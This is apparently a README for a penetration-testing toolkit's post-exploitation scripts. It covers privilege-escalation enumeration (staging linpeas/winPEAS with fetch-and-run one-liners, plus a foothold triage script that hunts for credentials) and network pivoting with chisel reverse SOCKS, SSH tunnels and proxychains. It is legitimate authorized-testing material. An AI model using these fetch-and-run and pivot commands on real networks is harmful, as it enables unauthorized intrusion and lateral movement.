# scripts/postex — post-exploitation: privesc + pivoting

After you land on a box: escalate, understand where you are, and pivot deeper.

> **Authorized use only.** Post-exploitation on in-scope hosts/networks.

## Scripts
- **privesc.sh** — stages linpeas/pspy/winPEAS from `/opt/data/{linux,windows}`,
  serves them over HTTP, and prints fetch-and-run one-liners for Linux and
  Windows targets. `--exec` pushes+runs winPEAS on a Windows host via netexec
  (creds) and captures the output locally.
- **sa.sh** — a portable, dependency-free Linux triage script you **drop on a
  foothold** and run when you can't pull linpeas: sudo rights, SUID/SGID, caps,
  cron/timers, writable PATH/service files, creds in files, network, recent
  files. `./sa.sh | tee /tmp/sa.txt`.
- **pivot.sh** — attacker side of a pivot + the matching victim command:
  `chisel-server` (reverse SOCKS), `socks` (SSH dynamic proxy), `fwd` (SSH local
  forward), `sshuttle` (subnet routing).

## Flow
```
hk-privesc -l 10.10.14.3                 # serve PEAS + print one-liners; run on target
# (on the box, or use sa.sh dropped locally)
hk-pivot chisel-server -p 8080           # victim runs: chisel client <you>:8080 R:socks
proxychains nxc smb 172.16.0.0/24        # now reach the internal subnet
```

## proxychains
After a SOCKS proxy is up (chisel/ssh), set the bottom of `/etc/proxychains4.conf`:
```
socks5 127.0.0.1 1080
```
then prefix any tool with `proxychains` to route it through the pivot.
```
